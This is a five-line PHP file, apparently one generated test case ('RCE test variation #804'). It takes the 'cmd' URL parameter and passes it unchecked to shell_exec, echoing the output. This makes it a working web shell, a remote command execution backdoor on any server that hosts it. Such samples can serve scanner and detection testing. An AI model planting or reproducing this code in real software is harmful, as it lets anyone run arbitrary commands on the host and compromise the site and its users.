<?php
// RCE test variation #804
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>